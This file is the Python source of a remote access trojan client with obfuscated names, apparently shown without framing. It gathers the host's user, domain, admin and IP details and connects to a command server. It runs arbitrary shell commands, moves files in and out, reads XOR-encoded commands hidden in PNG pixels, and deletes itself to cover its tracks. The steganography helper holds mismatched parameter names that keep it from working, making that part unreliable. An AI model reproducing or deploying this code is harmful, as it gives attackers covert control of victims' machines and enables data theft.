import socket
import subprocess
import threading
import os
import sys
import platform
import shlex
import time
import numpy as np
from PIL import Image
if os.name == 'nt':
    from win32comext.shell import shell
iKCvlehP = threading.Event()
SQwzDcVb = '.'
hQXJIhqU = '127.0.0.1'
hH1iAtGx = 4545
YXxJccXv = 'abcd'

def v02gj0VE(SNA9NPlm):
    yKy2Funj = False
    while True:
        try:
            XDCB7MnN = SNA9NPlm.recv(1024)
            if not XDCB7MnN:
                raise ValueError('Server disconnect!')
        except:
            os.remove(sys.argv[0])
            SNA9NPlm.close()
            os._exit(0)
        if yKy2Funj:
            XDCB7MnN = gt1WCbPj(AB5NcQsD(length=26, input='cover.png'), YXxJccXv)
            yKy2Funj = False
        else:
            XDCB7MnN = XDCB7MnN.decode('UTF-8')
        if ':msg:' in XDCB7MnN:
            pass
        if ':whoami:' in XDCB7MnN:
            Wm2nonkG = os.getlogin()
            SNA9NPlm.send(Wm2nonkG.encode())
        if 'c0mm@nd' in XDCB7MnN:
            kiStXwSC = XDCB7MnN.split('\n')
            kiStXwSC = kiStXwSC[1]
            if os.name == 'nt':
                kiStXwSC = 'cmd.exe /c ' + kiStXwSC
            Plhv9B2f = shlex.split(kiStXwSC)
            jhhb4yel = subprocess.Popen(Plhv9B2f, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            FUBj6svc = jhhb4yel.stdout.read().decode().strip()
            FUBj6svc = FUBj6svc.encode()
            jhhb4yel.stdin.close()
            jhhb4yel.terminate()
            SNA9NPlm.sendall(b'returned output: \n' + FUBj6svc + b'\n:endofoutput:\n')
        if 'self-destruct' in XDCB7MnN:
            os.remove(sys.argv[0])
            SNA9NPlm.close()
            os._exit(0)
        if ':upload:' in XDCB7MnN:
            SNA9NPlm.send(b'***Ready for upload to begin***!!\n')
            XDCB7MnN = XDCB7MnN.split(':')
            BRoJTVGs = XDCB7MnN[2]
            vSY8u4PP = int(XDCB7MnN[3])
            TMsrCXgK = SQwzDcVb + '/' + BRoJTVGs
            iKCvlehP.clear()
            glfWmAb4 = threading.Thread(target=uzFy4IfR, args=(SNA9NPlm, TMsrCXgK, vSY8u4PP))
            glfWmAb4.daemon = True
            glfWmAb4.start()
            while not iKCvlehP.is_set():
                time.sleep(1)
            if '.png' in BRoJTVGs:
                yKy2Funj = True
            SNA9NPlm.send(b'File successfully uploaded!\n')
        if '~download~' in XDCB7MnN:
            XDCB7MnN = XDCB7MnN.split('~')
            TMsrCXgK = XDCB7MnN[2]
            time.sleep(3)
            if not os.path.isfile(TMsrCXgK):
                SNA9NPlm.send(b'error\n')
                time.sleep(3)
                continue
            SNA9NPlm.send(b'OK\n')
            BRoJTVGs = os.path.basename(TMsrCXgK)
            vSY8u4PP = os.path.getsize(TMsrCXgK)
            vSY8u4PP = str(vSY8u4PP)
            SNA9NPlm.send(vSY8u4PP.encode())
            time.sleep(2)
            with open(TMsrCXgK, 'rb') as GbTYmB7m:
                for SjERRmLh in iter(lambda: GbTYmB7m.read(4096), b''):
                    SNA9NPlm.sendall(SjERRmLh)
            time.sleep(3)

def uzFy4IfR(SNA9NPlm, TMsrCXgK, vSY8u4PP):
    with open(TMsrCXgK, 'wb') as GbTYmB7m:
        AAKe0LTm = 0
        while AAKe0LTm < vSY8u4PP:
            XDCB7MnN = SNA9NPlm.recv(4096)
            if not XDCB7MnN:
                break
            if not '?keepalive?' in XDCB7MnN.decode('UTF-8', errors='ignore'):
                GbTYmB7m.write(XDCB7MnN)
                AAKe0LTm += len(XDCB7MnN)
    iKCvlehP.set()

def AB5NcQsD(A6xZUuKM=8, lEqCJPyl='cover.png', nVNGwquh=True):
    with Image.open(input) as pHwDyGEu:
        nOu1yIzW, cM1ZioL7 = pHwDyGEu.size
        XDCB7MnN = np.array(pHwDyGEu)
    XDCB7MnN = np.reshape(XDCB7MnN, nOu1yIzW * cM1ZioL7 * 3)
    XDCB7MnN = XDCB7MnN & 1
    XDCB7MnN = np.packbits(XDCB7MnN)
    if not nVNGwquh:
        BbGZy2fD = ''
        for HHamOk0F in XDCB7MnN:
            WEW6HJsL = chr(HHamOk0F)
            if len(BbGZy2fD) >= A6xZUuKM:
                break
            BbGZy2fD += WEW6HJsL
        return BbGZy2fD
    return bytes(XDCB7MnN[:A6xZUuKM])

def gt1WCbPj(CPzfVomW, YXxJccXv):
    YXxJccXv = YXxJccXv.encode('utf-8')
    if len(YXxJccXv) < len(CPzfVomW):
        YXxJccXv = (YXxJccXv * (len(CPzfVomW) // len(YXxJccXv) + 1))[:len(CPzfVomW)]
    Cmudq8gU = bytes([voWLelNz ^ hLhQYugT for voWLelNz, hLhQYugT in zip(CPzfVomW, YXxJccXv)])
    try:
        return Cmudq8gU.decode('utf-8')
    except UnicodeDecodeError:
        return Cmudq8gU

def Rmc9HJGC():
    hDbHQB42 = 'False'
    j2ooPRwy = 'False'
    UY7t96oF = '\nOS family: ' + os.name + '\nOS name: ' + platform.system() + '\nOS release: ' + platform.release() + '\nOS version: ' + platform.version() + '\nOS platform: ' + platform.platform()
    if os.name == 'nt':
        try:
            ZTKeMhyv = subprocess.run('powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1', capture_output=True, text=True)
            ZTKeMhyv = ZTKeMhyv.stdout.strip()
        except:
            ZTKeMhyv = 'No IP addresses active on system'
        try:
            vwDzKkJ9 = subprocess.run('whoami /FQDN', capture_output=True, text=True)
            if 'Unable' in vwDzKkJ9.stderr:
                hDbHQB42 = 'False'
            else:
                hDbHQB42 = 'True'
        except:
            pass
        aJn3Ok0h = subprocess.run('net user ' + os.environ.get('USERNAME'), capture_output=True, text=True)
        if 'Administrators' in aJn3Ok0h.stdout:
            j2ooPRwy = 'True'
        if hDbHQB42 == 'True':
            c3S3hZrs = os.environ['userdomain'] + '\\' + os.getlogin() + '\n[Elevated]: ' + str(shell.IsUserAnAdmin()) + '\nMember of Local Admins: ' + j2ooPRwy + '\n' + 'Domain Joined: ' + hDbHQB42 + '\n' + 'Domain Info: ' + vwDzKkJ9.stdout + '\n' + 'OS info: ' + UY7t96oF + '\n' + 'IP address info: ' + '\n' + ZTKeMhyv
        else:
            c3S3hZrs = os.environ.get('COMPUTERNAME') + '\\' + os.getlogin() + '\n[Elevated]: ' + str(shell.IsUserAnAdmin()) + '\nMember of Local Admins: ' + j2ooPRwy + '\n' + 'Domain Joined: ' + hDbHQB42 + '\n' + 'OS info: ' + UY7t96oF + '\n' + 'IP address info: ' + '\n' + ZTKeMhyv
    else:
        try:
            ZTKeMhyv = subprocess.run("ip -4 addr show | grep -oP '(?<=inet )\\d+(\\.\\d+){3}' | grep -v '^169\\.' | grep -v '^127.0.0.1'", capture_output=True, text=True, shell=True)
            ZTKeMhyv = ZTKeMhyv.stdout.strip()
        except:
            ZTKeMhyv = 'No IP addresses active on system'
        try:
            vwDzKkJ9 = subprocess.run(['hostname', '-f'], capture_output=True, text=True).stdout.strip()
            if '.' in vwDzKkJ9:
                hDbHQB42 = 'True'
            else:
                hDbHQB42 = 'False'
        except:
            pass
        aJn3Ok0h = subprocess.run(['sudo', '-v'], capture_output=True, text=True)
        if 'Sorry' not in aJn3Ok0h.stdout:
            j2ooPRwy = 'True'
        c3S3hZrs = vwDzKkJ9 + '\\' + os.getlogin() + '\nMember of Local Admins: ' + j2ooPRwy + '\n' + 'Domain Joined: ' + hDbHQB42 + '\n' + 'OS info: ' + UY7t96oF + '\n' + 'IP address info: ' + '\n' + ZTKeMhyv
    SNA9NPlm = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SNA9NPlm.connect((hQXJIhqU, hH1iAtGx))
    SNA9NPlm.send(c3S3hZrs.encode('UTF-8'))
    yjm89J2h = threading.Thread(target=v02gj0VE, args=(SNA9NPlm,))
    yjm89J2h.daemon = True
    yjm89J2h.start()
    while True:
        time.sleep(1)
if __name__ == '__main__':
    Rmc9HJGC()